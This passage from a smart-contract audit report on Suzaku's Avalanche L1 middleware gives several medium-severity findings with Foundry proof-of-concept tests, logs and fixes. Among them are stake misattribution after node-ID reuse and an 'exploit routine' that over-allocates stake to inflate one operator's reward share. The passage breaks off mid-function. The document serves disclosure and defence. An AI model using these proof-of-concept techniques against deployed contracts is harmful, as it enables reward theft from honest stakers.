        _setOperatorL1Shares(bob, validatorManagerAddress, assetClassId, operatorB, sharesB, delegator);

        _calcAndWarpOneEpoch(); // Ensure stakes are recognized

        // --- Epoch E0: Operator A registers node N1 using sharedNodeId_X ---
        console2.log("Epoch E0: Operator A registers node with sharedNodeId_X");
        uint48 epochE0 = middleware.getCurrentEpoch();
        vm.prank(operatorA);
        middleware.addNode(sharedNodeId_X, blsKey_A, registrationExpiry, pchainOwner_A, pchainOwner_A, 0);
        uint32 msgIdx_A1_add = mockValidatorManager.nextMessageIndex() - 1;

        // Get the L1 validationID for Operator A's node
        bytes memory pchainNodeId_P_X_bytes = abi.encodePacked(uint160(uint256(sharedNodeId_X)));
        bytes32 validationID_A1 = mockValidatorManager.registeredValidators(pchainNodeId_P_X_bytes);
        console2.log("Operator A's L1 validationID_A1:", vm.toString(validationID_A1));

        vm.prank(operatorA);
        middleware.completeValidatorRegistration(operatorA, sharedNodeId_X, msgIdx_A1_add);

        _calcAndWarpOneEpoch(); // Move to E0 + 1 for N1 to be active
        epochE0 = middleware.getCurrentEpoch(); // Update epochE0 to where node is active

        uint256 stake_A_on_N1 = middleware.getNodeStake(epochE0, validationID_A1);
        assertGt(stake_A_on_N1, 0, "Operator A's node N1 should have stake in Epoch E0");
        console2.log("Stake of Operator A on node N1 (validationID_A1) in Epoch E0:", vm.toString(stake_A_on_N1));

        bytes32[] memory activeNodes_A_E0 = middleware.getActiveNodesForEpoch(operatorA, epochE0);
        assertEq(activeNodes_A_E0.length, 1, "Operator A should have 1 active node in E0");
        assertEq(activeNodes_A_E0[0], sharedNodeId_X, "Active node for A in E0 should be sharedNodeId_X");

        // --- Epoch E1: Node N1 (validationID_A1) is fully removed ---
        console2.log("Epoch E1: Operator A removes node N1 (validationID_A1)");
        _calcAndWarpOneEpoch();
        uint48 epochE1 = middleware.getCurrentEpoch();

        vm.prank(operatorA);
        middleware.removeNode(sharedNodeId_X);
        uint32 msgIdx_A1_remove = mockValidatorManager.nextMessageIndex() - 1;

        _calcAndWarpOneEpoch(); // To process removal in cache
        epochE1 = middleware.getCurrentEpoch(); // Update E1 to where removal is cached

        assertEq(middleware.getNodeStake(epochE1, validationID_A1), 0, "Stake for validationID_A1 should be 0 after removal in cache");

        vm.prank(operatorA);
        middleware.completeValidatorRemoval(msgIdx_A1_remove); // L1 confirms removal

        console2.log("P-Chain NodeID P_X (derived from sharedNodeId_X) is now considered available on L1.");

        activeNodes_A_E0 = middleware.getActiveNodesForEpoch(operatorA, epochE1); // Check active nodes for A in E1
        assertEq(activeNodes_A_E0.length, 0, "Operator A should have 0 active nodes in E1 after removal");

        // --- Epoch E2: Operator B re-registers a node N2 using the *exact same sharedNodeId_X* ---
        console2.log("Epoch E2: Operator B registers a new node N2 using the same sharedNodeId_X");
        _calcAndWarpOneEpoch();
        uint48 epochE2 = middleware.getCurrentEpoch();

        vm.prank(operatorB);
        middleware.addNode(sharedNodeId_X, blsKey_B, registrationExpiry, pchainOwner_B, pchainOwner_B, 0);
        uint32 msgIdx_B2_add = mockValidatorManager.nextMessageIndex() - 1;

        // Get the L1 validationID for Operator B's new node (N2)
        bytes32 validationID_B2 = mockValidatorManager.registeredValidators(pchainNodeId_P_X_bytes);
        console2.log("Operator B's new L1 validationID_B2 for sharedNodeId_X:", vm.toString(validationID_B2));
        assertNotEq(validationID_A1, validationID_B2, "L1 validationID for B's node should be different from A's old one");

        vm.prank(operatorB);
        middleware.completeValidatorRegistration(operatorB, sharedNodeId_X, msgIdx_B2_add);

        _calcAndWarpOneEpoch(); // Move to E2 + 1 for N2 to be active
        epochE2 = middleware.getCurrentEpoch(); // Update epochE2 to where node is active

        uint256 stake_B_on_N2 = middleware.getNodeStake(epochE2, validationID_B2);
        assertGt(stake_B_on_N2, 0, "Operator B's node N2 should have stake in Epoch E2");
        console2.log("Stake of Operator B on node N2 (validationID_B2) in Epoch E2:", vm.toString(stake_B_on_N2));

        bytes32[] memory activeNodes_B_E2 = middleware.getActiveNodesForEpoch(operatorB, epochE2);
        assertEq(activeNodes_B_E2.length, 1, "Operator B should have 1 active node in E2");
        assertEq(activeNodes_B_E2[0], sharedNodeId_X);


        // --- Querying for Operator A's Stake in Epoch E2 (THE VULNERABILITY) ---
        console2.log("Querying Operator A's used stake in Epoch E2 (where B's node is active with sharedNodeId_X)");

        // Ensure caches are up-to-date for Operator A for epoch E2
        middleware.calcAndCacheStakes(epochE2, middleware.PRIMARY_ASSET_CLASS());

        uint256 usedStake_A_E2 = middleware.getOperatorUsedStakeCachedPerEpoch(epochE2, operatorA, middleware.PRIMARY_ASSET_CLASS());
        console2.log("Calculated 'used stake' for Operator A in Epoch E2: ", vm.toString(usedStake_A_E2));
        // ASSERTION: Operator A's used stake should be 0 in epoch E2, as their node was removed in E1.
        // However, due to the issue, it will pick up Operator B's stake.
        assertEq(usedStake_A_E2, stake_B_on_N2, "FAIL: Operator A's used stake in E2 is misattributed with Operator B's stake!");

        // Let's ensure B's node is indeed seen as active by the mock in E2
        Validator memory validator_B2_details = mockValidatorManager.getValidator(validationID_B2);
        uint48 epochE2_startTs = middleware.getEpochStartTs(epochE2);
        bool b_node_active_in_e2 = uint48(validator_B2_details.startedAt) <= epochE2_startTs &&
                                   (validator_B2_details.endedAt == 0 || uint48(validator_B2_details.endedAt) >= epochE2_startTs);
        assertTrue(b_node_active_in_e2, "Operator B's node (validationID_B2) should be active in Epoch E2");

        console2.log("--- PoC End ---");
    }
```
Output:
```bash
Ran 1 test for test/middleware/AvalancheL1MiddlewareTest.t.sol:AvalancheL1MiddlewareTest
[PASS] test_POC_MisattributedStake_NodeIdReused() (gas: 2012990)
Logs:
  --- POC: Misattributed Stake due to NodeID Reuse ---
  Epoch E0: Operator A registers node with sharedNodeId_X
  Operator A's L1 validationID_A1: 0x2f034f048644fc181bae4bb9cab7d7c67065f4763bd63c7a694231d82397709d
  Stake of Operator A on node N1 (validationID_A1) in Epoch E0: 160000000000800
  Epoch E1: Operator A removes node N1 (validationID_A1)
  P-Chain NodeID P_X (derived from sharedNodeId_X) is now considered available on L1.
  Epoch E2: Operator B registers a new node N2 using the same sharedNodeId_X
  Operator B's new L1 validationID_B2 for sharedNodeId_X: 0xe42be7d4d8b89ec6045a7938c29cb3ad84e0852269c9ce43f370002f92894cde
  Stake of Operator B on node N2 (validationID_B2) in Epoch E2: 240000000001200
  Querying Operator A's used stake in Epoch E2 (where B's node is active with sharedNodeId_X)
  Calculated 'used stake' for Operator A in Epoch E2:  240000000001200
  --- PoC End ---

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 4.58ms (1.30ms CPU time)

Ran 1 test suite in 142.55ms (4.58ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

**Recommended Mitigation:** The `AvalancheL1Middleware` must ensure that when calculating an operator's historical stake, it strictly associates the activity with the L1 validator instances *that operator originally registered*.

1.  **Store L1 `validationID` with Original Registration:** When an operator (e.g., Operator A) registers a `middlewareNodeId` (e.g., `nodeId_X`), the unique L1 `validationID` (e.g., `validationID_A1`) returned by `BalancerValidatorManager` must be durably linked to Operator A and `nodeId_X` for that specific registration lifecycle within the middleware.
2.  **Modify `getActiveNodesForEpoch` Logic:**
    *   When `getActiveNodesForEpoch(A, epoch)` is called, it should iterate through the `(middlewareNodeId, original_l1_validationID)` pairs that Operator A historically registered.
    *   For each `original_l1_validationID` (e.g., `validationID_A1`):
        *   Query `balancerValidatorManager.getValidator(validationID_A1)` to get its historical `startedAt` and `endedAt` times.
        *   If this specific instance `validationID_A1` was active during the queried `epoch`, then use `validationID_A1` to look up stake in `nodeStakeCache`.
    *   This prevents the lookup from "slipping" to a newer `validationID` (like `validationID_B2`) that might currently be associated with the reused P-Chain NodeID `P_X` on L1 but was not the instance Operator A managed.

**Suzaku:**
Fixed in commit [2a88616](https://github.com/suzaku-network/suzaku-core/pull/155/commits/2a886168f4d4e63a6344c4de45d57bd8d9d851b6).

**Cyfrin:** Verified.

## [M-13] Incorrect inclusion of removed nodes in `_require Min Secondary Asset Classes` during `force Update Nodes`
- Severity: `Medium`
- Source report: `core.md`

### Detailed Content (from source)
**Description:** The function `_requireMinSecondaryAssetClasses` is utilized within the `forceUpdateNodes` process. During execution, if a node is removed in the first iteration, the subsequent iteration still includes the removed node in the `_requireMinSecondaryAssetClasses` computation because the node remains in the list until the full removal process completes.

```solidity
if ((newStake < assetClasses[PRIMARY_ASSET_CLASS].minValidatorStake)
                    || !_requireMinSecondaryAssetClasses(0, operator)) {
      newStake = 0;
      _initializeEndValidationAndFlag(operator, valID, nodeId);
}
```
**Example Scenario:**

1. `forceUpdateNodes` is invoked for an operator managing 5 nodes and the operator stake dropped from the last epoch.
2. On the first iteration, the first node is removed due to a drop in the value of `_requireMinSecondaryAssetClasses` is executed.
3. On the second iteration, while checking if the second node should be removed, `_requireMinSecondaryAssetClasses` incorrectly includes the previously removed first node in its calculations, even though it is slated for removal. This will ultimately remove all five nodes.

This problem will occur only if the last epoch's operator stake dropped and the `limitStake` is a small value.

**Impact:** This behaviour can lead to inaccurate evaluations during node removal decisions. The presence of nodes marked for removal after the `_requireMinSecondaryAssetClasses` calculations can cause the system to misjudge whether the minimum requirements for secondary asset classes are met. This may result in either:

* Preventing necessary node removals, thereby retaining nodes that should be removed, or
* Causing inconsistencies in node state management, potentially affecting operator performance and system integrity.

**Proof of concept:**

 ```solidity
function test_AddNodes_AndThenForceUpdate() public {
        // Move to the next epoch so we have a clean slate
        uint48 epoch = _calcAndWarpOneEpoch();

        // Prepare node data
        bytes32 nodeId = 0x00000000000000000000000039a662260f928d2d98ab5ad93aa7af8e0ee4d426;
        bytes memory blsKey = hex"1234";
        uint64 registrationExpiry = uint64(block.timestamp + 2 days);
        bytes32 nodeId1 = 0x00000000000000000000000039a662260f928d2d98ab5ad93aa7af8e0ee4d626;
        bytes memory blsKey1 = hex"1235";
        bytes32 nodeId2 = 0x00000000000000000000000039a662260f928d2d98ab5ad93aa7af8e0ee4d526;
        bytes memory blsKey2 = hex"1236";
        address[] memory ownerArr = new address[](1);
        ownerArr[0] = alice;
        PChainOwner memory ownerStruct = PChainOwner({threshold: 1, addresses: ownerArr});

        // Add node
        vm.prank(alice);
        middleware.addNode(nodeId, blsKey, registrationExpiry, ownerStruct, ownerStruct, 0);
        bytes32 validationID = mockValidatorManager.registeredValidators(abi.encodePacked(uint160(uint256(nodeId))));

        vm.prank(alice);

        middleware.addNode(nodeId1, blsKey1, registrationExpiry, ownerStruct, ownerStruct, 0);
        bytes32 validationID1 = mockValidatorManager.registeredValidators(abi.encodePacked(uint160(uint256(nodeId1))));

        vm.prank(alice);

        middleware.addNode(nodeId2, blsKey2, registrationExpiry, ownerStruct, ownerStruct, 0);
        bytes32 validationID2 = mockValidatorManager.registeredValidators(abi.encodePacked(uint160(uint256(nodeId2))));

        // Check node stake from the public getter
        uint256 nodeStake = middleware.getNodeStake(epoch, validationID);
        assertGt(nodeStake, 0, "Node stake should be >0 right after add");

        bytes32[] memory activeNodesBeforeConfirm = middleware.getActiveNodesForEpoch(alice, epoch);
        assertEq(activeNodesBeforeConfirm.length, 0, "Node shouldn't appear active before confirmation");

        vm.prank(alice);
        // messageIndex = 0 in this scenario
        middleware.completeValidatorRegistration(alice, nodeId, 0);
        middleware.completeValidatorRegistration(alice, nodeId1, 1);

        middleware.completeValidatorRegistration(alice, nodeId2, 2);

        vm.startPrank(staker);
        (uint256 burnedShares, uint256 mintedShares_) = vault.withdraw(staker, 10_000_000);
        vm.stopPrank();

        _calcAndWarpOneEpoch();

        _setupAssetClassAndRegisterVault(2, 5, collateral2, vault3, 3000 ether, 2500 ether, delegator3);
        collateral2.transfer(staker, 10);
        vm.startPrank(staker);
        collateral2.approve(address(vault3), 10);
        (uint256 depositUsedA, uint256 mintedSharesA) = vault3.deposit(staker, 10);
        vm.stopPrank();

        _warpToLastHourOfCurrentEpoch();

        middleware.forceUpdateNodes(alice, 0);
        assertEq(middleware.nodePendingRemoval(validationID), false);
    }
```

**Recommended Mitigation:** Consider changing the implementation of `_requireMinSecondaryAssetClasses` to accept an `int256` parameter instead of a `uint256`. In the `forceUpdateNodes method`, if a node is removed, increment a counter and pass a negative value equal to the number of removed nodes.
If node removal occurs across multiple epochs, consider making the solution more robust, for example creating a counter of nodes, which are in process of removing.

```diff
- function _requireMinSecondaryAssetClasses(uint256 extraNode, address operator) internal view returns (bool) {
+ function _requireMinSecondaryAssetClasses(int256 extraNode, address operator) internal view returns (bool) {
        uint48 epoch = getCurrentEpoch();
        uint256 nodeCount = operatorNodesArray[operator].length; // existing nodes

        uint256 secCount = secondaryAssetClasses.length();
        if (secCount == 0) {
            return true;
        }
        for (uint256 i = 0; i < secCount; i++) {
            uint256 classId = secondaryAssetClasses.at(i);
            uint256 stake = getOperatorStake(operator, epoch, uint96(classId));
            // Check ratio vs. class's min stake, could add an emit here to debug
            if (stake / (nodeCount + extraNode) < assetClasses[classId].minValidatorStake) {
                return false;
            }
        }
        return true;
    }
```

**Suzaku:**
Fixed in commit [91ae0e3](https://github.com/suzaku-network/suzaku-core/pull/155/commits/91ae0e331f4400522b071c0d7093704f1c1b2dbe).

**Cyfrin:** Verified.

## [M-14] Incorrect vault status determination in `Middleware Vault Manager`
- Severity: `Medium`
- Source report: `core.md`

### Detailed Content (from source)
**Description:** The `MiddlewareVaultManager::_wasActiveAt()`  determines whether a vault was active at a specific timestamp. This function is used by the `getVaults()` method to filter active vaults for a given epoch.

The current implementation of `_wasActiveAt()` incorrectly considers a vault to be active at the exact timestamp when it was disabled. The function returns true when:

- The vault has been enabled (enabledTime != 0)
- The vault was enabled at or before the timestamp (enabledTime <= timestamp)
- AND EITHER:
       - The vault was never disabled (disabledTime == 0) OR
       - The vault's disabled timestamp is greater than or equal to the query timestamp (disabledTime >= timestamp)


```solidity
// Current implementation
function _wasActiveAt(uint48 enabledTime, uint48 disabledTime, uint48 timestamp) private pure returns (bool) {
    return enabledTime != 0 && enabledTime <= timestamp && (disabledTime == 0 || disabledTime >= timestamp);
}
```

The issue is with the third condition (`disabledTime >= timestamp`). This logic means that a vault disabled exactly at the timestamp being queried (e.g., at the start of an epoch) would still be considered active for that epoch, which is counterintuitive. Typically, when an entity is disabled at a specific timestamp, it should be considered inactive from that timestamp forward.


**Impact:** Vaults disabled exactly at an epoch boundary to be incorrectly included as active in that epoch.

**Recommended Mitigation:** Consider modifying the `_wasActiveAt()` function to use a strict inequality for the disablement check.

**Suzaku:**
Fixed in commit [9bbbcfc](https://github.com/suzaku-network/suzaku-core/pull/155/commits/9bbbcfce7bedd1dd4e60fdf55bb5f13ba8ab4847).

**Cyfrin:** Verified.

## [M-15] Insufficient update window validation can cause denial of service in `force Update Nodes`
- Severity: `Medium`
- Source report: `core.md`

### Detailed Content (from source)
**Description:** The `AvalancheL1Middleware` constructor fails to validate that the `UPDATE_WINDOW` parameter is less than the `EPOCH_DURATION`. This validation is critically important because the `onlyDuringFinalWindowOfEpoch` modifier, which is essential for stake management functionality, will permanently revert if `UPDATE_WINDOW` is greater than or equal to `EPOCH_DURATION`.

The `onlyDuringFinalWindowOfEpoch` modifier works by enforcing that a function can only be called during a specific time window at the end of an epoch:

```solidity
modifier onlyDuringFinalWindowOfEpoch() {
    uint48 currentEpoch = getCurrentEpoch();
    uint48 epochStartTs = getEpochStartTs(currentEpoch);
    uint48 timeNow = Time.timestamp();
    uint48 epochUpdatePeriod = epochStartTs + UPDATE_WINDOW;

    if (timeNow < epochUpdatePeriod || timeNow > epochStartTs + EPOCH_DURATION) { //@audit always reverts if UPDATE_WINDOW >= EPOCH_DURATION
        revert AvalancheL1Middleware__NotEpochUpdatePeriod(timeNow, epochUpdatePeriod);
    }
    _;
}
```

The modifier creates a valid execution window only when:

- `timeNow >= epochStartTs + UPDATE_WINDOW` (after the update window starts)
- `timeNow <= epochStartTs + EPOCH_DURATION` (before the epoch ends)

For this window to exist, `UPDATE_WINDOW` must be less than `EPOCH_DURATION`.

The constructor currently only validates that `slashingWindow` is not less than `epochDuration` but lacks a check for the `UPDATE_WINDOW`:

```solidity
constructor(
    AvalancheL1MiddlewareSettings memory settings,
    // other parameters...
) AssetClassRegistry(owner) {
    // other checks...

    if (settings.slashingWindow < settings.epochDuration) {
        revert AvalancheL1Middleware__SlashingWindowTooShort(settings.slashingWindow, settings.epochDuration);
    }

    // @audit No validation for UPDATE_WINDOW relation to EPOCH_DURATION

    // Initializations...
    EPOCH_DURATION = settings.epochDuration;
    UPDATE_WINDOW = settings.stakeUpdateWindow;
    // other initializations...
}
```

Since both `EPOCH_DURATION` and `UPDATE_WINDOW` are set as immutable variables, this issue cannot be corrected after deployment.

**Impact:** The `forceUpdateNodes()` function will be permanently unusable since it's protected by the `onlyDuringFinalWindowOfEpoch` modifier

**Recommended Mitigation:** Consider adding an explicit validation in the constructor to ensure that `UPDATE_WINDOW> 0 &&  UPDATE_WINDOW < EPOCH_DURATION`. Additionally, consider adding a comment clearly explaining the relationship between these time parameters to help prevent configuration errors:

```solidity
/**
 * @notice Required relationship between time parameters:
 * 0 < UPDATE_WINDOW < EPOCH_DURATION <= SLASHING_WINDOW
 */
```

**Suzaku:**
Fixed in commit [4f9d52a](https://github.com/suzaku-network/suzaku-core/pull/155/commits/4f9d52ac520312cfc0877a355f3d064229725fa2).

**Cyfrin:** Verified.

## [M-16] Insufficient validation in `Avalanche L1Middleware::remove Operator` can create permanent validator lockup
- Severity: `Medium`
- Source report: `core.md`

### Detailed Content (from source)
**Description:** Removal of operators with active nodes, whether intentional or by accident, can permanently lock operator nodes and disrupt the protocol node rebalancing process.

The `AvalancheL1Middleware::disableOperator` and `AvalancheL1Middleware::removeOperator()` lack validation to ensure operators have no active nodes before removal.

```solidity
// AvalancheL1Middleware.sol
  function disableOperator(
        address operator
    ) external onlyOwner updateGlobalNodeStakeOncePerEpoch {
        operators.disable(operator); //@note disable an operator - this only works if operator exists
    }
function removeOperator(
    address operator
) external onlyOwner updateGlobalNodeStakeOncePerEpoch {
    (, uint48 disabledTime) = operators.getTimes(operator);
    if (disabledTime == 0 || disabledTime + SLASHING_WINDOW > Time.timestamp()) {
        revert AvalancheL1Middleware__OperatorGracePeriodNotPassed(disabledTime, SLASHING_WINDOW);
    }
    operators.remove(operator); // @audit no check
}
```

Once an operator is removed, most node management functions become permanently inaccessible due to access control restrictions:

```solidity
modifier onlyRegisteredOperatorNode(address operator, bytes32 nodeId) {
    if (!operators.contains(operator)) {
        revert AvalancheL1Middleware__OperatorNotRegistered(operator); // @audit Always fails for removed operators
    }
    if (!operatorNodes[operator].contains(nodeId)) {
        revert AvalancheL1Middleware__NodeNotFound(nodeId);
    }
    _;
}

// Force updates also blocked
function forceUpdateNodes(address operator, uint256 limitStake) external {
    if (!operators.contains(operator)) {
        revert AvalancheL1Middleware__OperatorNotRegistered(operator); // @audit prevents any force updates
    }
    // ... rest of function never executes
}

// Individual node operations blocked
function removeNode(bytes32 nodeId) external
    onlyRegisteredOperatorNode(msg.sender, nodeId) // @audit modifier blocks removed operators
{
    _removeNode(msg.sender, nodeId);
}
```


**Impact:**
1. permanent validator lockup where operators cannot exit the P-Chain
2. disproportionate stake reduction for remaining operators during undelegations
3. removed operators cannot be rebalanced

**Proof of Concept:** Run the test in AvalancheL1MiddlewareTest.t.sol

```solidity
function test_POC_RemoveOperatorWithActiveNodes() public {
    uint48 epoch = _calcAndWarpOneEpoch();

    // Add nodes for alice
    (bytes32[] memory nodeIds, bytes32[] memory validationIDs,) = _createAndConfirmNodes(alice, 3, 0, true);

    // Move to next epoch to ensure nodes are active
    epoch = _calcAndWarpOneEpoch();

    // Verify alice has active nodes and stake
    uint256 nodeCount = middleware.getOperatorNodesLength(alice);
    uint256 aliceStake = middleware.getOperatorStake(alice, epoch, assetClassId);
    assertGt(nodeCount, 0, "Alice should have active nodes");
    assertGt(aliceStake, 0, "Alice should have stake");

    console2.log("Before removal:");
    console2.log("  Active nodes:", nodeCount);
    console2.log("  Operator stake:", aliceStake);

    // First disable the operator (required for removal)
    vm.prank(validatorManagerAddress);
    middleware.disableOperator(alice);

    // Warp past the slashing window to allow removal
    uint48 slashingWindow = middleware.SLASHING_WINDOW();
    vm.warp(block.timestamp + slashingWindow + 1);

    // @audit Admin can remove operator with active nodes (NO VALIDATION!)
    vm.prank(validatorManagerAddress);
    middleware.removeOperator(alice);

    // Verify alice is removed from operators mapping
      address[] memory currentOperators = middleware.getAllOperators();
        bool aliceFound = false;
        for (uint256 i = 0; i < currentOperators.length; i++) {
            if (currentOperators[i] == alice) {
                aliceFound = true;
                break;
            }
        }
        console2.log("Alice found:", aliceFound);
        assertFalse(aliceFound, "Alice should not be in current operators list");

    // Verify alice's nodes still exist in storage
    assertEq(middleware.getOperatorNodesLength(alice), nodeCount, "Alice's nodes should still exist in storage");

    // Verify alice's nodes still have stake cached
    for (uint256 i = 0; i < nodeIds.length; i++) {
        uint256 nodeStake = middleware.nodeStakeCache(epoch, validationIDs[i]);
        assertGt(nodeStake, 0, "Node should still have cached stake");
    }

    // Verify stake calculations still work
    uint256 stakeAfterRemoval = middleware.getOperatorStake(alice, epoch, assetClassId);
    assertEq(stakeAfterRemoval, aliceStake, "Stake calculation should still work");

}
```

**Recommended Mitigation:** Consider allowing operator removal only if all active nodes of that operator are removed.


**Suzaku:**
Fixed in commit [f0a6a49](https://github.com/suzaku-network/suzaku-core/pull/155/commits/f0a6a49313f9a9789a8fb1bcaadeabf4aa63a3f8).

**Cyfrin:** Verified.

## [M-17] Operator can over allocate the same stake to unlimited nodes within one epoch causing weight inflation and reward theft
- Severity: `Medium`
- Source report: `core.md`

### Detailed Content (from source)
**Description:** The `AvalancheL1Middleware::addNode()` function is the entry-point an operator calls to register a new P-chain validator.
Before accepting the request the function asks `_getOperatorAvailableStake()` how much of the operator’s collateral is still free. That helper subtracts only `operatorLockedStake[operator]` from `totalStake`.

```solidity
    function addNode(
        bytes32 nodeId,
        bytes calldata blsKey,
        uint64 registrationExpiry,
        PChainOwner calldata remainingBalanceOwner,
        PChainOwner calldata disableOwner,
        uint256 stakeAmount // optional
    ) external updateStakeCache(getCurrentEpoch(), PRIMARY_ASSET_CLASS) updateGlobalNodeStakeOncePerEpoch {
        ...
        ...

        bytes32 valId = balancerValidatorManager.registeredValidators(abi.encodePacked(uint160(uint256(nodeId))));
        uint256 available = _getOperatorAvailableStake(operator);
        ...
        ...
    }
```


```solidity
    function _getOperatorAvailableStake(
        address operator
    ) internal view returns (uint256) {
        uint48 epoch = getCurrentEpoch();
        uint256 totalStake = getOperatorStake(operator, epoch, PRIMARY_ASSET_CLASS);

        ...
        ...

        uint256 lockedStake = operatorLockedStake[operator];
        if (totalStake <= lockedStake) {
            return 0;
        }
        return totalStake - lockedStake;
    }
```

However, `AvalancheL1Middleware::addNode()` never **increments** `operatorLockedStake` after it decides to use `newStake`.
As long as the call happens in the same epoch `lockedStake` remains 0, so every subsequent call to `addNode()` sees the *full* collateral as still “free” and can register another validator of maximal weight.
Per-operator stake is therefore double-counted while the epoch is in progress.

Removal of the excess nodes is only possible through `AvalancheL1Middleware::forceUpdateNodes()`, which is gated by `onlyDuringFinalWindowOfEpoch` and can be executed **only after** the epoch’s `UPDATE_WINDOW` has elapsed.
Because reward accounting (`getOperatorUsedStakeCachedPerEpoch() → getActiveNodesForEpoch()`) snapshots validators at the **start** of the epoch, all the extra nodes created early in the epoch are treated as fully active for the whole rewards period.
The attacker can therefore inflate their weight and capture a disproportionate share of the epoch’s reward pool.

```solidity
function getActiveNodesForEpoch(
    address operator,
    uint48 epoch
) external view returns (bytes32[] memory activeNodeIds) {
    uint48 epochStartTs = getEpochStartTs(epoch);

    // Gather all nodes from the never-removed set
    bytes32[] memory allNodeIds = operatorNodes[operator].values();

    bytes32[] memory temp = new bytes32[](allNodeIds.length);
    uint256 activeCount;

    for (uint256 i = 0; i < allNodeIds.length; i++) {
        bytes32 nodeId = allNodeIds[i];
        bytes32 validationID =
            balancerValidatorManager.registeredValidators(abi.encodePacked(uint160(uint256(nodeId))));
        Validator memory validator = balancerValidatorManager.getValidator(validationID);

        if (_wasActiveAt(uint48(validator.startedAt), uint48(validator.endedAt), epochStartTs)) {
            temp[activeCount++] = nodeId;
        }
    }

    activeNodeIds = new bytes32[](activeCount);
    for (uint256 j = 0; j < activeCount; j++) {
        activeNodeIds[j] = temp[j];
    }
}
```
**Impact:** * A malicious operator can spin up an unlimited number of validators without added collateral, blowing past intended per-operator limits.
* Reward distribution is skewed: the sum of operator, vault and curator shares exceeds 100 % and honest participants are diluted.

**Proof of Concept:**
```solidity
// ─────────────────────────────────────────────────────────────────────────────
// PoC: Exploiting the missing stake-locking in addNode()
// ─────────────────────────────────────────────────────────────────────────────
import {AvalancheL1MiddlewareTest} from "./AvalancheL1MiddlewareTest.t.sol";

import {Rewards}            from "src/contracts/rewards/Rewards.sol";
import {MockUptimeTracker}  from "../mocks/MockUptimeTracker.sol";
import {ERC20Mock}          from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";

import {VaultTokenized}     from "src/contracts/vault/VaultTokenized.sol";
import {PChainOwner}        from "@avalabs/teleporter/validator-manager/interfaces/IValidatorManager.sol";

import {console2}           from "forge-std/console2.sol";

contract PoCMissingLockingRewards is AvalancheL1MiddlewareTest {
    // ── helpers & globals ────────────────────────────────────────────────────
    MockUptimeTracker internal uptimeTracker;   // Simulates uptime records
    Rewards          internal rewards;          // Rewards contract under test
    ERC20Mock        internal rewardsToken;     // Dummy ERC-20 for payouts

    address internal REWARDS_MANAGER_ROLE    = makeAddr("REWARDS_MANAGER_ROLE");
    address internal REWARDS_DISTRIBUTOR_ROLE = makeAddr("REWARDS_DISTRIBUTOR_ROLE");

    // Main exploit routine ----------------------------------------------------
    function test_PoCRewardsManipulated() public {
        _setupRewards();                                      // 1. deploy & fund rewards system
        address[] memory operators = middleware.getAllOperators();

        // --- STEP 1: move to a fresh epoch ----------------------------------
        console2.log("Warping to a fresh epoch");
        vm.warp(middleware.getEpochStartTs(middleware.getCurrentEpoch() + 1));
        uint48 epoch = middleware.getCurrentEpoch();          // snapshot for later

        // --- STEP 2: create *too many* nodes for Alice ----------------------
        console2.log("Creating 4 nodes for Alice with the same stake");
        uint256 stake1 = 200_000_000_002_000;          // Alice's full stake
        _createAndConfirmNodes(alice, 4, stake1, true);     // ← re-uses the same stake 4 times

        // Charlie behaves honestly – one node, fully staked
        console2.log("Creating 1 node for Charlie with the full stake");
        uint256 stake2 = 150_000_000_000_000;
        _createAndConfirmNodes(charlie, 1, stake2, true);

        // --- STEP 3: Remove Alice's unbacked nodes at the earliest possible moment------
        console2.log("Removing Alice's unbacked nodes at the earliest possible moment");
        uint48 nextEpoch = middleware.getCurrentEpoch() + 1;
        uint256 afterUpdateWindow =
            middleware.getEpochStartTs(nextEpoch) + middleware.UPDATE_WINDOW() + 1;
        vm.warp(afterUpdateWindow);
        middleware.forceUpdateNodes(alice, type(uint256).max);

        // --- STEP 4: advance to the rewards epoch ---------------------------
        console2.log("Advancing and caching stakes");
        _calcAndWarpOneEpoch();                               // epoch rollover, stakes cached
        middleware.calcAndCacheStakes(epoch, assetClassId);   // ensure operator stakes cached

        // --- STEP 5: mark everyone as fully up for the epoch ----------------
        console2.log("Marking everyone as fully up for the epoch");
        for (uint i = 0; i < operators.length; i++) {
            uptimeTracker.setOperatorUptimePerEpoch(epoch, operators[i], 4 hours);
        }

        // --- STEP 6: advance a few epochs so rewards can be distributed -------
        console2.log("Advancing 3 epochs so rewards can be distributed ");
        _calcAndWarpOneEpoch(3);

        // --- STEP 7: distribute rewards (attacker gets oversized share) -----
        console2.log("Distributing rewards");
        vm.prank(REWARDS_DISTRIBUTOR_ROLE);
        rewards.distributeRewards(epoch, uint48(operators.length));

        // --- STEP 8: verify that the share accounting exceeds 100 % ---------
        console2.log("Verifying that the share accounting exceeds 100 %");
        uint256 totalShares = 0;
        // operator shares
        for (uint i = 0; i < operators.length; i++) {
            totalShares += rewards.operatorShares(epoch, operators[i]);
        }
        // vault shares
        address[] memory vaults = vaultManager.getVaults(epoch);
        for (uint i = 0; i < vaults.length; i++) {
            totalShares += rewards.vaultShares(epoch, vaults[i]);
        }
        // curator shares
        for (uint i = 0; i < vaults.length; i++) {
            totalShares += rewards.curatorShares(epoch, VaultTokenized(vaults[i]).owner());
        }
        assertGt(totalShares, 10000); // > 100 % allocated

        // --- STEP 9: attacker & others claim their rewards ---------
        console2.log("Claiming rewards");
        _claimRewards(epoch);
    }

    // Claim helper – each stakeholder pulls what the Rewards contract thinks
    // they earned (spoiler: the attacker earns too much)
    function _claimRewards(uint48 epoch) internal {
        address[] memory operators = middleware.getAllOperators();
        // claim as operators --------------------------------------------------
        for (uint i = 0; i < operators.length; i++) {
            address op = operators[i];
            vm.startPrank(op);
            if (rewards.operatorShares(epoch, op) > 0) {
                rewards.claimOperatorFee(address(rewardsToken), op);
            }
            vm.stopPrank();
        }
        // claim as vaults / stakers ------------------------------------------
        address[] memory vaults = vaultManager.getVaults(epoch);
        for (uint i = 0; i < vaults.length; i++) {
            vm.startPrank(staker);
            rewards.claimRewards(address(rewardsToken), vaults[i]);
            vm.stopPrank();

            vm.startPrank(VaultTokenized(vaults[i]).owner());
            rewards.claimCuratorFee(address(rewardsToken), VaultTokenized(vaults[i]).owner());
            vm.stopPrank();
        }
        // protocol fee --------------------------------------------------------
        vm.startPrank(owner);
        rewards.claimProtocolFee(address(rewardsToken), owner);
        vm.stopPrank();
    }

    // Deploy rewards contracts, mint tokens, assign roles, fund epochs -------
    function _setupRewards() internal {
        uptimeTracker = new MockUptimeTracker();
        rewards       = new Rewards();

        // initialise with fee splits & uptime threshold
        rewards.initialize(
            owner,                          // admin
